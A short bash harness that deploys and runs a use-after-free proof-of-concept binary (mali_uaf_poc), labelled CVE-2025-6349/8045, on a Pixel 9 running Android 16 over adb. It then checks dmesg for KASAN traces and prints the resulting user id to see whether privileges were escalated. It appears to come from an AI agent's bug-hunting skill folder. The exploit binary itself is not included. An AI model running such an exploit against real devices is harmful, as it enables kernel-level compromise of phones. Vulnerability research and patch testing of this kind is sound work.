#!/bin/bash
# Run CVE-2025-6349/8045 POC Test
set -e

POC_PATH="/home/unlockerplus/.kilo/skills/shaby-tech-bug-hunter"
POC_BIN="mali_uaf_poc"
DEVICE="${1:-}"
ADB="adb"
[ -n "$DEVICE" ] && ADB="adb -s $DEVICE"

echo "=== CVE-2025-6349/8045 POC Test ==="
echo "Target: Pixel 9 (Tokay) Android 16"
echo ""

# Check device
if ! $ADB devices 2>&1 | grep -q "device$"; then
    echo "[-] No device connected"
    exit 1
fi

echo "[*] Device: $($ADB shell getprop ro.product.model 2>/dev/null)"
echo "[*] Android: $($ADB shell getprop ro.build.version.release 2>/dev/null)"
echo ""

# Deploy
echo "[*] Deploying POC..."
$ADB push $POC_PATH/$POC_BIN /data/local/tmp/
$ADB shell chmod +x /data/local/tmp/$POC_BIN

# Clear logs
$ADB shell dmesg -C 2>/dev/null || true

# Run
echo "[*] Running exploit..."
echo ""
$ADB shell /data/local/tmp/$POC_BIN 2>&1 || true

echo ""
echo "[*] Checking dmesg..."
$ADB shell dmesg | grep -iE "(kasan|use-after-free|double-free|mali)" | tail -20 || echo "(no indicators)"

echo ""
echo "[*] Privileges:"
$ADB shell id
